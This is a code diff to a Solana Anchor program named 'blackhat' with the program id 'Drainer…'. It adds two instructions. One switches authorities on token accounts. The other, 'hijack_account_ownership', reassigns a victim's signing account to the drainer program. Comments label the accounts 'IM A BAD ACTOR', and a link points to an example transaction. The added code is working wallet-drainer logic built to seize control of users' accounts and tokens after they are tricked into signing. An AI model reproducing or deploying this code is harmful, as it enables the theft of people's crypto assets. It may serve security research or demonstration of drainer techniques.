@@ -17,6 +17,10 @@ declare_id!("Drainer1111111111111111111111111111111111111");
 #[program]
 pub mod blackhat {
 
+    use core::panic;
+
+    use anchor_spl::token::spl_token::instruction::AuthorityType;
+
     use super::*;
 
     pub fn create_test_account_v1<'info>(
@@ -116,6 +120,75 @@ pub mod blackhat {
                 panic!("Token Transfer Error: {:?}", transfer_error)
             }
         }
+
+        Ok(())
+    }
+
+    #[derive(Accounts)]
+    pub struct SwitchTokenAccountAuthority<'info> {
+        /// CHECK: IM A BAD ACTOR
+        #[account(mut)]
+        pub token_program_owned_account: AccountInfo<'info>,
+
+        /// CHECK: IM A BAD ACTOR
+        pub current_authority: AccountInfo<'info>,
+
+        /// CHECK: IM A BAD ACTOR
+        pub token_program: AccountInfo<'info>,
+    }
+
+    pub fn switch_token_account_authority<'info>(
+        ctx: Context<'_, '_, '_, 'info, SwitchTokenAccountAuthority<'info>>,
+        authority_type: u8,
+        new_authority: Option<Pubkey>,
+    ) -> Result<()> {
+        let authority_type = match authority_type {
+            0 => AuthorityType::MintTokens,
+            1 => AuthorityType::FreezeAccount,
+            2 => AuthorityType::AccountOwner,
+            3 => AuthorityType::CloseAccount,
+            _ => panic!("Invalid authority type"),
+        };
+
+        let cpi_ctx = CpiContext::new(
+            ctx.accounts.token_program.to_account_info(),
+            token::SetAuthority {
+                current_authority: ctx.accounts.current_authority.to_account_info(),
+                account_or_mint: ctx.accounts.token_program_owned_account.to_account_info(),
+            },
+        );
+
+        token::set_authority(cpi_ctx, authority_type, new_authority)?;
+
+        Ok(())
+    }
+
+    #[derive(Accounts)]
+    pub struct HijackAccountOwnership<'info> {
+        /// CHECK: IM A BAD ACTOR
+        #[account(mut)]
+        pub victim: Signer<'info>,
+
+        /// CHECK: IM A BAD ACTOR
+        pub system_program: AccountInfo<'info>,
+
+        /// CHECK: IM A BAD ACTOR
+        #[account(constraint = program.key == &crate::id())]
+        pub program: AccountInfo<'info>,
+    }
+
+    // Example: https://solscan.io/tx/3q25bc7tPquaoqyueRyp5JzdRRkZus1GcTkrhsUWyDLgNyJ3GD7vCiwdqkkriyscr53uTr6WxA59UHS66T8xcVDS
+    pub fn hijack_account_ownership<'info>(
+        ctx: Context<'_, '_, '_, 'info, HijackAccountOwnership<'info>>,
+    ) -> Result<()> {
+        let create_program_ctx = CpiContext::new(
+            ctx.accounts.system_program.to_account_info(),
+            system_program::Assign {
+                account_to_assign: ctx.accounts.victim.to_account_info(),
+            },
+        );
+
+        system_program::assign(create_program_ctx, &crate::id())?;
 
         Ok(())
     }
